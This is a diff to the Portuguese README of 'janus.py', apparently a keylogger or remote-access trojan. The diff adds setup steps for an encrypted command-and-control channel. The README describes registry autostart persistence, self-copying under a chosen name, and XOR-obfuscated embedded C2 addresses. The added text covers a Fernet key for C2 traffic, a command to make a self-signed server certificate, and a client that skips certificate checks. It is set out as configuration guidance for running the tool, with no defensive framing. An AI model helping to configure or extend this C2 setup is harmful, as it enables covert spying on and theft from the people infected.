@@ -31,7 +31,7 @@
 ## 📦 Dependências
 
 ```bash
-pip install pynput
+pip install pynput cryptography
 ```
 
 ---
@@ -63,13 +63,21 @@ Crie um arquivo `.env` na mesma pasta do `janus.py` e configure as variáveis. O
 | `PROGRAM_NAME` | `""` | Nome usado na cópia/persistência |
 | `REGISTRY_KEY_PATH` | `""` | Chave de autostart no registro |
 | `DECRYPT_KEY` | `""` | Chave XOR dos padrões ofuscados (obrigatória para o env-only funcionar) |
+| `C2_KEY` | `""` | Chave Fernet (base64) do canal C2 — a mesma nos dois lados |
 
 Exemplo:
 ```ini
 JANUS_IP=192.168.0.10
 JANUS_PORT=443
 DECRYPT_KEY=trocar-pela-sua-chave
+C2_KEY=<chave Fernet em base64>
 ```
+
+> **Canal seguro (`SecureC2Channel`):** o tráfego C2 é cifrado com **TLS + Fernet**. Gere a chave Fernet uma única vez (`python -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())"`) e coloque em `C2_KEY` nos dois `.env`. O servidor (`connection.py`) precisa de um certificado auto-assinado (`server.crt`/`server.key`) — gere com:
+> ```bash
+> openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -days 365 -subj "/CN=janus-gate"
+> ```
+> O cliente ignora a validação do certificado (`CERT_NONE`).
 
 > **Ofuscação (`encrypt/`):** os valores embutidos no `janus.py` (IP, porta, `PROGRAM_NAME`, chave de registro) estão em hex XOR gerado pela ferramenta `encrypt/`. Para customizar, gere o hex com ela e troque no código, usando a mesma `DECRYPT_KEY` no `.env`.
 
